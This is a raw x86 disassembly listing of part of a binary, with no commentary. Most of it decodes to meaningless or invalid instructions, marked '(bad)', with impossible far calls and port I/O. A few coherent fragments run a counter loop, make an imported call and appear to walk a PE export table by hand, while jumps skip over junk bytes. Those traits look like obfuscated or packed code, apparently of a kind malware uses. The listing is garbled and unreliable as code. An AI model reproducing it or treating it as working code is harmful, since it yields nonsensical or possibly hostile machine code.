  40ae3f:	mov    dl,BYTE PTR [edx-0x62]
  40ae42:	pop    esp
  40ae43:	add    DWORD PTR [ebp+edx*4+0x73],ecx
  40ae47:	and    BYTE PTR [ecx+0x43b2d85e],0x6c
  40ae4e:	daa    
  40ae4f:	and    cl,BYTE PTR [esi-0x7f]
  40ae52:	or     ecx,DWORD PTR [ebx]
  40ae54:	ret    0xff6a
  40ae57:	fcmovne st,st(0)
  40ae59:	or     edx,DWORD PTR [eax+0x6e]
  40ae5c:	push   esp
  40ae5d:	jno    0x40ae80
  40ae5f:	add    dh,BYTE PTR [ebp+ebx*1-0x1d]
  40ae63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae64:	or     ah,bh
  40ae66:	mov    esi,DWORD PTR [edx+0x14]
  40ae69:	sqrtps xmm2,XMMWORD PTR ds:0xa6c54c2e
  40ae70:	js     0x40adf8
  40ae72:	retf   
  40ae73:	test   al,0x6c
  40ae75:	(bad)  
  40ae76:	mov    ah,0xb5
  40ae78:	xlat   BYTE PTR ds:[ebx]
  40ae79:	dec    ecx
  40ae7a:	dec    edx
  40ae7b:	or     ebx,ebp
  40ae7d:	inc    ebx
  40ae7e:	inc    ebp
  40ae7f:	ins    BYTE PTR es:[edi],dx
  40ae80:	call   0xfbf1:0xcc27d134
  40ae87:	sub    DWORD PTR [ecx],esp
  40ae89:	mov    es,WORD PTR [ebx]
  40ae8b:	ror    BYTE PTR [eax-0x8ecec8b],1
  40ae91:	nop
  40ae92:	scas   eax,DWORD PTR es:[edi]
  40ae93:	mov    DWORD PTR [ebx-0x4b],ebp
  40ae96:	add    bl,BYTE PTR [ebp-0x3d850834]
  40ae9c:	dec    ebx
  40ae9d:	jae    0x40ae4c
  40ae9f:	lods   al,BYTE PTR ds:[esi]
  40aea0:	int3   
  40aea1:	scas   al,BYTE PTR es:[edi]
  40aea2:	in     al,0x76
  40aea4:	or     BYTE PTR [ebp-0x623a4498],dh
  40aeaa:	dec    ecx
  40aeab:	sub    eax,0xe2bd0ee3
  40aeb0:	pop    eax
  40aeb1:	pusha  
  40aeb2:	sub    al,0x17
  40aeb4:	dec    ebx
  40aeb5:	and    edx,edi
  40aeb7:	mul    DWORD PTR [ecx+0x4521ca8c]
  40aebd:	sbb    BYTE PTR [edx-0x64],dl
  40aec0:	mov    ds:0x9ce157bd,eax
  40aec5:	mov    edx,0x8589b140
  40aeca:	pop    edx
  40aecb:	mov    eax,ds:0xbacbbbba
  40aed0:	mul    DWORD PTR [ebx-0x570aaa54]
  40aed6:	mov    ebx,0x4e5dce0a
  40aedb:	shl    BYTE PTR [ebp-0x20],cl
  40aede:	popf   
  40aedf:	not    bl
  40aee1:	in     eax,0xaa
  40aee3:	in     eax,0xf2
  40aee5:	repnz stc 
  40aee7:	lods   eax,DWORD PTR ds:[esi]
  40aee8:	inc    ebp
  40aee9:	test   DWORD PTR [ecx+edx*8-0x75],ebp
  40aeed:	int    0x96
  40aeef:	pop    edx
  40aef0:	arpl   WORD PTR [esi],di
  40aef2:	daa    
  40aef3:	sub    eax,0xff985b95
  40aef8:	inc    eax
  40aef9:	fcomip st,st(7)
  40aefb:	out    0xb9,eax
  40aefd:	lods   eax,DWORD PTR ds:[esi]
  40aefe:	popa   
  40aeff:	mov    ebx,0x968cc930
  40af04:	adc    dh,BYTE PTR [ecx-0x35]
  40af07:	imul   ebx,DWORD PTR [eax-0x8803a63],0x6a
  40af0e:	clc    
  40af0f:	add    al,0x20
  40af11:	adc    esi,DWORD PTR [ebx+0x4138f07e]
  40af17:	mov    ch,0xf2
  40af19:	mov    dh,0x92
  40af1b:	mov    gs,WORD PTR [ebx+0x208f4328]
  40af21:	jmp    0x40aea6
  40af23:	lods   eax,DWORD PTR ds:[esi]
  40af24:	adc    eax,0x948179f5
  40af29:	jnp    0x40af5c
  40af2b:	stos   DWORD PTR es:[edi],eax
  40af2c:	and    dh,ah
  40af2e:	xchg   edx,edx
  40af30:	jo     0x40aebd
  40af32:	aad    0x4d
  40af34:	lods   eax,DWORD PTR ds:[esi]
  40af35:	pusha  
  40af36:	stos   DWORD PTR es:[edi],eax
  40af37:	mov    bh,0xbd
  40af39:	mov    DWORD PTR [ecx+ebx*2+0x7b221127],ebp
  40af40:	bndldx bnd0,[ebx]
  40af43:	data16 cmp BYTE PTR ds:0xd557a839,ch
  40af4a:	lock xlat BYTE PTR ds:[ebx]
  40af4c:	xchg   BYTE PTR [ebx],dh
  40af4e:	in     eax,0xfb
  40af50:	cmp    BYTE PTR [edi+0x59],0x7c
  40af54:	xor    dl,BYTE PTR [ecx]
  40af56:	das    
  40af57:	cmp    ah,BYTE PTR [eax]
  40af59:	xlat   BYTE PTR ds:[ebx]
  40af5a:	scas   al,BYTE PTR es:[edi]
  40af5b:	cmp    bl,dl
  40af5d:	or     al,0x1b
  40af5f:	std    
  40af60:	inc    edx
  40af61:	adc    DWORD PTR [edx-0x74],eax
  40af64:	in     eax,dx
  40af65:	and    DWORD PTR [edi-0x2a],ebx
  40af68:	push   cs
  40af69:	popa   
  40af6a:	pusha  
  40af6b:	or     dh,cl
  40af6d:	test   eax,0x8b514606
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	ds dec eax
  40b019:	cmp    eax,DWORD PTR [ebx+0x7e7ef764]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	aaa    
  40b024:	jmp    0x40afc9
  40b026:	adc    esi,ecx
  40b028:	mov    ah,0xab
  40b02a:	push   cs
  40b02b:	mov    al,ds:0x6685b5b
  40b030:	scas   eax,DWORD PTR es:[edi]
  40b031:	into   
  40b032:	mov    eax,ds:0xa11a2a28
  40b037:	es push ecx
  40b039:	sub    al,0x91
  40b03b:	inc    edx
  40b03c:	enter  0x109a,0xe2
  40b040:	add    eax,0x95237863
  40b045:	pop    ebp
  40b046:	aam    0xfd
  40b048:	cmp    al,0xf5
  40b04a:	pop    ss
  40b04b:	dec    esi
  40b04c:	mov    edx,0xd084f778
  40b051:	int    0x96
  40b053:	call   0x13f4:0xc7538036
  40b05a:	cmp    al,0x2f
  40b05c:	push   ds
  40b05d:	(bad)  
  40b05f:	sbb    BYTE PTR [ecx],bh
  40b061:	loop   0x40b02b
  40b063:	ja     0x40b042
  40b065:	push   esi
  40b066:	neg    DWORD PTR [eax]
  40b068:	xchg   esp,eax
  40b069:	das    
  40b06a:	mov    esp,0x338be98d
  40b06f:	xchg   ecx,eax
  40b070:	cld    
  40b071:	loopne 0x40b0c3
  40b073:	xor    esp,ecx
  40b075:	push   ebp
  40b076:	xchg   esi,eax
  40b077:	and    eax,0x1071e46a
  40b07c:	sub    DWORD PTR [edx],ebp
  40b07e:	push   edi
  40b07f:	(bad)  
  40b080:	push   eax
  40b081:	xchg   DWORD PTR [ecx],ebp
  40b083:	fild   WORD PTR [esi]
  40b085:	mov    eax,0x5c866d70
  40b08a:	loope  0x40b0c2
  40b08c:	pop    edx
  40b08d:	mov    DWORD PTR [ebx+0x66],ecx
  40b090:	mov    al,0xbe
  40b092:	in     eax,dx
  40b093:	push   ebx
  40b094:	cmp    al,0xf4
  40b096:	scas   eax,DWORD PTR es:[edi]
  40b097:	shr    ah,0x20
  40b09a:	enter  0x8f2b,0xf9
  40b09e:	arpl   WORD PTR [ebx+0x14a29368],dx
  40b0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a5:	loope  0x40b0fe
  40b0a7:	nop
  40b0a8:	adc    edx,DWORD PTR [ebp+0x3b]
  40b0ab:	cmp    DWORD PTR [ecx-0x7f],ebp
  40b0ae:	ins    BYTE PTR es:[edi],dx
  40b0af:	cmp    DWORD PTR [ecx+0x5505015f],esi
  40b0b5:	xlat   BYTE PTR ds:[ebx]
  40b0b6:	das    
  40b0b7:	jae    0x40b0c4
  40b0b9:	fisub  DWORD PTR [ecx+eiz*1+0x13]
  40b0bd:	mov    dh,0xf0
  40b0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0c0:	inc    eax
  40b0c1:	push   ds
  40b0c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c3:	and    BYTE PTR [edx+0x51],0x46
  40b0c7:	sbb    ch,BYTE PTR [ebp+0x2b45e78b]
  40b0cd:	and    DWORD PTR [ebx+esi*2-0x7751b3e6],0x68b1760e
  40b0d8:	loop   0x40b14c
  40b0da:	push   esi
  40b0db:	gs xor eax,0xd7a55b54
  40b0e1:	jnp    0x40b0d1
  40b0e3:	das    
  40b0e4:	cld    
  40b0e5:	push   ds
  40b0e6:	adc    BYTE PTR ds:[edi+0x639aaafc],bl
  40b0ed:	dec    edi
  40b0ee:	mov    edx,0x718f529f
  40b0f3:	mov    dl,0xd3
  40b0f5:	sub    bl,BYTE PTR [ebp-0x20]
  40b0f8:	inc    ecx
  40b0f9:	xchg   ebx,eax
  40b0fa:	test   al,0xb9
  40b0fc:	sbb    eax,0xd294dd4f
  40b101:	inc    ecx
  40b102:	adc    esp,DWORD PTR [edi]
  40b104:	sahf   
  40b105:	adc    al,ch
  40b107:	(bad)
  40b10b:	mov    DWORD PTR [ebp-0xe],ecx
  40b10e:	mov    ebx,0xb8a6826e
  40b113:	imul   edx,DWORD PTR cs:[ebx+0xe],0x6c6077cc
  40b11b:	mov    ebp,0x666ff9c3
  40b120:	xchg   esi,eax
  40b121:	test   BYTE PTR [ecx+0x53f0416],0xaa
  40b128:	push   es
  40b129:	mov    ebx,0x3a9e8311
  40b12e:	pop    eax
  40b12f:	pushf  
  40b130:	mov    ecx,0xaed43dd3
  40b135:	pop    es
  40b136:	mov    cl,0xd5
  40b138:	pop    ecx
  40b139:	mov    DWORD PTR [eax-0x16],ebp
  40b13c:	xor    eax,0x16808c74
  40b141:	sub    dl,dh
  40b143:	pop    ebp
  40b144:	inc    esp
  40b145:	je     0x40b111
  40b147:	stc    
  40b148:	stos   DWORD PTR es:[edi],eax
  40b149:	add    eax,0x9dfc587e
  40b14e:	fsubr  DWORD PTR [ebp-0x7977d89e]
  40b154:	cmp    edx,edx
  40b156:	mov    cl,0xc1
  40b158:	xor    dl,cl
  40b15a:	push   ecx
  40b15b:	or     ebp,ebp
  40b15d:	pop    ebx
  40b15e:	xchg   edx,eax
  40b15f:	add    DWORD PTR [esi+0x34],ecx
  40b162:	sub    DWORD PTR [edi],eax
  40b164:	(bad)  
  40b165:	lds    edi,FWORD PTR [edi+0x6]
  40b168:	scas   al,BYTE PTR es:[edi]
  40b169:	jl     0x40b125
  40b16b:	daa    
  40b16c:	(bad)  
  40b16e:	bound  edi,QWORD PTR [esi-0x62]
  40b171:	inc    edi
  40b172:	ds sahf 
  40b174:	outs   dx,BYTE PTR ds:[esi]
  40b175:	icebp  
  40b176:	ret    
  40b177:	imul   esi,DWORD PTR [eax+eax*8],0x2e
  40b17b:	(bad)  
  40b17d:	pop    edx
  40b17e:	and    BYTE PTR [edx-0x46b936c7],cl
  40b184:	sahf   
  40b185:	sub    edx,DWORD PTR [esi-0x3d10af8d]
  40b18b:	inc    esi
  40b18c:	imul   eax,DWORD PTR [bx+di+0x358b],0x16
  40b192:	jb     0x40b162
  40b194:	call   0xe06d:0xbced57b
  40b19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b19c:	mov    al,ds:0xeafa8d8d
  40b1a1:	pop    esp
  40b1a2:	rcl    eax,0x8c
  40b1a5:	fiadd  WORD PTR [eax]
  40b1a7:	lods   al,BYTE PTR ds:[esi]
  40b1a8:	imul   eax,DWORD PTR [edx+0x1f],0x14
  40b1ac:	loopne 0x40b18f
  40b1ae:	out    dx,al
  40b1af:	(bad)  
  40b1b0:	cmp    DWORD PTR [edi],edx
  40b1b2:	in     eax,0x34
  40b1b4:	sbb    eax,0x98d12d1a
  40b1b9:	popf   
  40b1ba:	xchg   edi,eax
  40b1bb:	xchg   ebx,eax
  40b1bc:	add    DWORD PTR [ecx-0x3e],0xa96ccdad
  40b1c3:	out    0xfb,eax
  40b1c5:	test   edx,esp
  40b1c7:	cmp    eax,DWORD PTR [ebx-0x125a764c]
  40b1cd:	jle    0x40b199
  40b1cf:	retf   0x173f
  40b1d2:	xchg   edx,eax
  40b1d3:	push   ss
  40b1d4:	mov    al,0xab
  40b1d6:	stos   DWORD PTR es:[edi],eax
  40b1d7:	add    DWORD PTR [edx-0x5fe3a417],ebp
  40b1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1de:	popf   
  40b1df:	sub    DWORD PTR [esi-0x2f3c5a15],ebp
  40b1e5:	jl     0x40b199
  40b1e7:	mov    eax,ds:0xb8a9311a
  40b1ec:	lods   eax,DWORD PTR ds:[esi]
  40b1ed:	mov    esp,fs
  40b1ef:	int    0x7
  40b1f1:	test   DWORD PTR [esi],eax
  40b1f3:	pop    es
  40b1f4:	push   ds
  40b1f5:	cmp    ch,BYTE PTR ds:0xb9f51d3f
  40b1fb:	cmp    ebx,DWORD PTR [esp+eiz*4-0x22]
  40b1ff:	setnp  BYTE PTR [esi]
  40b202:	mov    cl,dh
  40b204:	fidiv  DWORD PTR [esi+0x40]
  40b207:	mov    BYTE PTR [ebx],bh
  40b209:	xor    BYTE PTR [edi],ch
  40b20b:	rcr    BYTE PTR [eax+0x39985001],1
  40b211:	add    esi,DWORD PTR [esp+edi*2-0x3c5126e2]
  40b218:	dec    ebx
  40b219:	sbb    ch,BYTE PTR [edi+esi*1]
  40b21c:	mov    ah,0xad
  40b21e:	inc    eax
  40b21f:	mov    edx,0x2b3ba3ec
  40b224:	adc    ah,BYTE PTR [esp+eax*2]
  40b227:	inc    edi
  40b228:	inc    edi
  40b229:	int3   
  40b22a:	lea    esp,[ebp-0x2a]
  40b22d:	ret    
  40b22e:	mov    ds,WORD PTR [esi-0x73]
  40b231:	jb     0x40b235
  40b233:	dec    edx
  40b234:	jl     0x40b27a
  40b236:	loopne 0x40b2ad
  40b238:	inc    BYTE PTR [eax]
  40b23a:	jmp    0x40b29c
  40b23c:	add    ah,ch
  40b23e:	sub    al,0x92
  40b240:	(bad)  
  40b242:	mov    ecx,0x9dd9beb8
  40b247:	and    BYTE PTR [esi+0x3b8a8f96],0xbc
  40b24e:	push   edi
  40b24f:	mov    edx,0x32ab5773
  40b254:	cmp    al,0xb9
  40b256:	sbb    ah,cl
  40b258:	jb     0x40b296
  40b25a:	inc    ebx
  40b25b:	lea    eax,[edx+0x75fd7000]
  40b261:	scas   eax,DWORD PTR es:[edi]
  40b262:	adc    DWORD PTR [esi-0x3a6d100f],ebx
  40b268:	lock mov eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	shr    DWORD PTR [eax*4+0x7ef22ee7],0x7e
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	repz hlt 
  40b291:	lock add ah,BYTE PTR [esi+0x64959336]
  40b298:	cmp    dl,BYTE PTR [edi+0x4eb19edb]
  40b29e:	ja     0x40b29d
  40b2a0:	js     0x40b300
  40b2a2:	add    al,0xef
  40b2a4:	mov    bh,dl
  40b2a6:	ja     0x40b2d0
  40b2a8:	adc    DWORD PTR [eax],ecx
  40b2aa:	jae    0x40b253
  40b2ac:	xchg   DWORD PTR [edi],edx
  40b2ae:	shl    ch,cl
  40b2b0:	pushf  
  40b2b1:	(bad)  
  40b2b2:	xchg   ah,ah
  40b2b4:	in     al,0xcb
  40b2b6:	push   ebx
  40b2b7:	(bad)  
  40b2b8:	ret    
  40b2b9:	cmc    
  40b2ba:	push   ebp
  40b2bb:	jmp    0x403ab7a3
  40b2c0:	outs   dx,BYTE PTR ds:[esi]
  40b2c1:	or     al,0xa8
  40b2c3:	out    0xe8,al
  40b2c5:	mov    fs,WORD PTR [edx]
  40b2c7:	les    ebx,FWORD PTR [eax]
  40b2c9:	jecxz  0x40b24e
  40b2cb:	out    dx,al
  40b2cc:	test   DWORD PTR [edi+0x6b],edi
  40b2cf:	loopne 0x40b25e
  40b2d1:	arpl   WORD PTR [ebx+0x2f],cx
  40b2d4:	outs   dx,DWORD PTR ds:[esi]
  40b2d5:	fmul   DWORD PTR [edi]
  40b2d7:	cmp    esi,ebx
  40b2d9:	cmp    edi,edx
  40b2db:	retf   
  40b2dc:	sbb    eax,0x5a79a26d
  40b2e1:	in     al,0x49
  40b2e3:	jb     0x40b2df
  40b2e5:	push   ecx
  40b2e6:	js     0x40b2dc
  40b2e8:	mov    esp,0xcc85bb2a
  40b2ed:	ror    DWORD PTR [ebx+edx*1+0x32f47263],cl
  40b2f4:	mov    eax,0xae194b1b
  40b2f9:	or     DWORD PTR gs:[ecx-0x20],ebx
  40b2fd:	cmp    dh,BYTE PTR [esi-0x29]
  40b300:	or     BYTE PTR [eax+0x57095c37],ah
  40b306:	mov    ebp,DWORD PTR [edx]
  40b308:	lock xchg ebp,eax
  40b30a:	add    bl,ch
  40b30c:	sti    
  40b30d:	and    eax,0x6a3c9132
  40b312:	jo     0x40b374
  40b314:	add    al,0x1f
  40b316:	ret    0x4173
  40b319:	test   ah,ah
  40b31b:	mov    eax,DWORD PTR [ebx-0x7b29a7f1]
  40b321:	cs mov edi,esi
  40b324:	in     al,0x43
  40b326:	sbb    BYTE PTR [ebx-0x3ccf8662],dh
  40b32c:	push   0xd8dec566
  40b331:	or     eax,0x4f942a53
  40b336:	pop    ss
  40b337:	cmp    eax,0xe912fc19
  40b33c:	mov    edi,0x61d650f1
  40b341:	cmp    ch,bl
  40b343:	lods   al,BYTE PTR ds:[esi]
  40b344:	nop
  40b345:	lock ds adc eax,0xc15f9e56
  40b34c:	lock fs mov edx,0x64b48b6
  40b353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b354:	mov    WORD PTR [eax+0x3a],es
  40b357:	scas   al,BYTE PTR es:[edi]
  40b358:	popf   
  40b359:	push   esi
  40b35a:	outs   dx,BYTE PTR ds:[esi]
  40b35b:	mov    ebp,0xcabaa65d
  40b360:	nop
  40b361:	pusha  
  40b362:	(bad)  
  40b363:	xchg   ecx,eax
  40b364:	in     al,dx
  40b365:	(bad)  
  40b366:	jl     0x40b397
  40b368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b369:	dec    esp
  40b36a:	es stos DWORD PTR es:[edi],eax
  40b36c:	rcl    DWORD PTR ds:0x88ef03a4,cl
  40b372:	xchg   esp,eax
  40b373:	rcl    ch,cl
  40b375:	mov    ch,0x16
  40b377:	xchg   ebp,eax
  40b378:	std    
  40b379:	mov    DWORD PTR [esi+0x7d5ac24],0x8994eb2d
  40b383:	in     al,dx
  40b384:	inc    ebp
  40b385:	cmp    al,0x8e
  40b387:	and    DWORD PTR [ebp-0x37bafad3],0x97f6508c
  40b391:	or     bl,ch
  40b393:	mov    al,BYTE PTR [ebx-0x57cfdc14]
  40b399:	mov    ch,0xd0
  40b39b:	test   BYTE PTR [ebp+0x1d],bl
  40b39e:	(bad)  [eax-0x80]
  40b3a1:	and    al,0x9
  40b3a3:	fbld   TBYTE PTR [ebx+0x37ddc5a1]
  40b3a9:	jne    0x40b3e1
  40b3ab:	or     ecx,DWORD PTR ds:0x9d729e08
  40b3b1:	ja     0x40b35f
  40b3b3:	sahf   
  40b3b4:	cdq    
  40b3b5:	xchg   DWORD PTR [ecx+0x53],eax
  40b3b8:	mov    esi,0x7ce24b5b
  40b3bd:	dec    ebx
  40b3be:	shl    BYTE PTR [ecx+edi*2+0x21],1
  40b3c2:	sti    
  40b3c3:	or     eax,edx
  40b3c5:	or     dl,ah
  40b3c7:	rcr    BYTE PTR [eax-0x49],1
  40b3ca:	adc    edx,DWORD PTR [edi]
  40b3cc:	mov    ebp,esi
  40b3ce:	aad    0x52
  40b3d0:	inc    esi
  40b3d1:	mov    BYTE PTR [esi],dh
  40b3d3:	rol    DWORD PTR [esi-0x23079721],cl
  40b3d9:	xchg   edx,eax
  40b3da:	sar    DWORD PTR [edi],0x82
  40b3dd:	scas   al,BYTE PTR es:[edi]
  40b3de:	loopne 0x40b436
  40b3e0:	mov    ebp,0xaa33e03f
  40b3e5:	or     eax,0x5a3f6754
  40b3ea:	jns    0x40b456
  40b3ec:	cmp    al,0x89
  40b3ee:	sub    al,dh
  40b3f0:	in     eax,0x9b
  40b3f2:	(bad)  
  40b3f3:	jle    0x40b3a9
  40b3f5:	sbb    eax,0xdb9cc313
  40b3fa:	lods   al,BYTE PTR ds:[esi]
  40b3fb:	cmp    DWORD PTR [eax],0x5ca677f3
  40b401:	adc    eax,0xc5174293
  40b406:	outs   dx,BYTE PTR ds:[esi]
  40b407:	aad    0x8c
  40b409:	test   eax,0x21219b0b
  40b40e:	test   eax,esi
  40b410:	add    BYTE PTR [edi-0x5c],ah
  40b413:	sbb    bh,ah
  40b415:	fist   WORD PTR [esi+0x2a9f78c6]
  40b41b:	leave  
  40b41c:	out    dx,al
  40b41d:	jmp    DWORD PTR [edx]
  40b41f:	xor    eax,0xfce68dd1
  40b424:	hlt    
  40b425:	sahf   
  40b426:	pop    ebx
  40b427:	adc    BYTE PTR [ebx],dh
  40b429:	cmp    edi,DWORD PTR [edi+ebx*8]
  40b42c:	in     eax,0xa8
  40b42e:	push   ebp
  40b42f:	ret    0xe69a
  40b432:	pop    edx
  40b433:	xchg   ebp,eax
  40b434:	cmp    DWORD PTR [ebp-0x2ff4a21b],edi
  40b43a:	fisub  DWORD PTR [edx+edx*2+0x3cd2d78c]
  40b441:	jge    0x40b41e
  40b443:	cmp    eax,0x3cf30538
  40b448:	je     0x40b4b2
  40b44a:	add    eax,0x3458eef0
  40b44f:	repz test al,0x42
  40b452:	into   
  40b453:	mov    eax,ds:0x9c3e00c
  40b458:	xor    ebp,DWORD PTR [edi+0x7b]
  40b45b:	mov    al,BYTE PTR [ecx-0x6e8c13c5]
  40b461:	lock in eax,0x7f
  40b464:	dec    ebx
  40b465:	push   eax
  40b466:	pop    ds
  40b467:	mov    ch,BYTE PTR ss:[ebp+0x21]
  40b46b:	rol    ebx,0xa5
  40b46e:	inc    esi
  40b46f:	lahf   
  40b470:	mov    ebx,0x6fd56bf8
  40b475:	dec    eax
  40b476:	mov    esi,0x4fcf8cd
  40b47b:	fldenv [ecx]
  40b47d:	mov    ecx,0x94b7848f
  40b482:	aaa    
  40b483:	sahf   
  40b484:	xchg   edx,eax
  40b485:	ret    
  40b486:	mov    ds:0xbf447408,al
  40b48b:	adc    eax,0x3a14ea35
  40b490:	arpl   WORD PTR [ebx-0x39],sp
  40b493:	rcl    bh,1
  40b495:	or     eax,0x4fab0426
  40b49a:	dec    esp
  40b49b:	out    dx,al
  40b49c:	scas   eax,DWORD PTR es:[edi]
  40b49d:	lock sbb ch,cl
  40b4a0:	iret   
  40b4a1:	inc    ebp
  40b4a2:	shr    bl,0x1f
  40b4a5:	xor    BYTE PTR es:[esi+0x1672a203],al
  40b4ac:	push   es
  40b4ad:	mov    al,ds:0x665a0986
  40b4b2:	frndint 
  40b4b4:	enter  0x9461,0xf1
  40b4b8:	bound  ebx,QWORD PTR [ebp-0x3658eb13]
  40b4be:	ds call 0x8ff0:0x81abe148
  40b4c6:	jbe    0x40b4b8
  40b4c8:	popa   
  40b4c9:	jmp    0xc96c8756
  40b4ce:	adc    ch,BYTE PTR [esp+ecx*8]
  40b4d1:	ror    dh,1
  40b4d3:	push   ecx
  40b4d4:	aas    
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	out    0x87,eax
  40b509:	or     ecx,ecx
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b588
  40b514:	loopne 0x40b513
  40b516:	push   edx
  40b517:	and    BYTE PTR [edi-0x6a],ah
  40b51a:	xor    bl,BYTE PTR [edx]
  40b51c:	pusha  
  40b51d:	es inc eax
  40b51f:	mov    eax,0xdc08a810
  40b524:	stos   DWORD PTR es:[edi],eax
  40b525:	add    eax,0xba88a271
  40b52a:	inc    esi
  40b52b:	ficomp DWORD PTR [edx]
  40b52d:	inc    ebx
  40b52e:	sub    al,BYTE PTR [esi+0x2576ee18]
  40b534:	loop   0x40b57c
  40b536:	int3   
  40b537:	xchg   BYTE PTR [edi+0x7e32316c],al
  40b53d:	call   0x31caae
  40b542:	fistp  WORD PTR [ecx-0x66df1a51]
  40b548:	mov    ch,0xb3
  40b54a:	adc    DWORD PTR [ecx],ebp
  40b54c:	or     DWORD PTR [ecx-0x322a48ec],ebp
  40b552:	mov    ?,WORD PTR [esi+0x30]
  40b555:	mov    eax,eax
  40b557:	mov    ds:0x14977ea8,eax
  40b55c:	jge    0x40b586
  40b55e:	mov    edi,edx
  40b560:	das    
  40b561:	out    0xe4,eax
  40b563:	jge    0x40b567
  40b565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b566:	out    dx,eax
  40b567:	inc    edx
  40b568:	mov    esp,0x551f4dd3
  40b56d:	and    bl,ah
  40b56f:	cli    
  40b570:	cli    
  40b571:	xchg   BYTE PTR [ecx-0x2f],dl
  40b574:	pop    ecx
  40b575:	jmp    0x40b516
  40b577:	mov    ebx,0xd20c300
  40b57c:	xchg   edi,eax
  40b57d:	xor    ah,BYTE PTR [edi+edi*2+0x1a]
  40b581:	mov    esp,0xeff4551d
  40b586:	cdq    
  40b587:	mov    edi,eax
  40b589:	push   cs
  40b58a:	sti    
  40b58b:	hlt    
  40b58c:	sti    
  40b58d:	stos   DWORD PTR es:[edi],eax
  40b58e:	xchg   esp,eax
  40b58f:	daa    
  40b590:	mov    al,ds:0x11e6447c
  40b595:	dec    ecx
  40b596:	fs jmp 0xf6caa88
  40b59c:	mov    edx,0xb405c40c
  40b5a1:	in     al,0x97
  40b5a3:	mov    ah,0x5c
  40b5a5:	nop
  40b5a6:	dec    edx
  40b5a7:	in     eax,dx
  40b5a8:	outs   dx,DWORD PTR ds:[esi]
  40b5a9:	and    dh,BYTE PTR [edx-0x29]
  40b5ac:	xchg   edi,eax
  40b5ad:	std    
  40b5ae:	sbb    bl,BYTE PTR [edi+0x7453601d]
  40b5b4:	mov    ch,0x6e
  40b5b6:	mov    DWORD PTR [edi+ecx*1-0x5dad606d],esi
  40b5bd:	cmp    BYTE PTR [edx-0x73],0x5d
  40b5c1:	xchg   ebx,eax
  40b5c2:	mov    ah,0x39
  40b5c4:	mov    al,0x1
  40b5c6:	dec    esi
  40b5c7:	xor    al,0x2a
  40b5c9:	dec    ebx
  40b5ca:	xchg   DWORD PTR [esi],esp
  40b5cc:	inc    esi
  40b5cd:	mov    bh,0xcc
  40b5cf:	jns    0x40b5d5
  40b5d1:	push   0x71
  40b5d3:	sar    DWORD PTR [edi+0x16],cl
  40b5d6:	mov    ebx,0xc09172cb
  40b5db:	jae    0x40b647
  40b5dd:	inc    edx
  40b5de:	sar    BYTE PTR [esp+eiz*2+0x1f],cl
  40b5e2:	ja     0x40b585
  40b5e4:	adc    al,0x83
  40b5e6:	xchg   edx,eax
  40b5e7:	pop    edx
  40b5e8:	push   ecx
  40b5e9:	test   al,0xa
  40b5eb:	sub    al,0xf
  40b5ed:	cmc    
  40b5ee:	mov    ecx,0x1e8e00da
